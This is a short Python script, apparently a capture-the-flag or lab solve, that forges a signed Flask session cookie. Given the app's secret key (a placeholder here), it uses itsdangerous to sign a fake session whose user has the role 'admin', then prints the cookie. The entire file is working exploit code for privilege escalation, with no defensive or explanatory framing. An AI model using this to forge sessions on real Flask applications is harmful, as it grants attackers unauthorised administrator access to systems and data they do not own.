import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

secret_key = "<FLASK_SECRET_KEY>"

# Create a session serializer
serializer = TaggedJSONSerializer()
signer_kwargs = {
    "key_derivation": "hmac",
    "digest_method": hashlib.sha1
}
s = URLSafeTimedSerializer(
    secret_key,
    salt="cookie-session",
    serializer=serializer,
    signer_kwargs=signer_kwargs
)

# Forge a session as admin
fake_session = {
    "user": {
        "username": "I_am_the_admin_48404658fe9cfa5fd7921118ceb2b08b06c6a2f63fd059d8a9c7c83376a15f24",
        "role": "admin"  # This grants admin privileges
    }
}

# Generate the signed cookie
cookie = s.dumps(fake_session)
print(f"Admin session cookie: {cookie}")
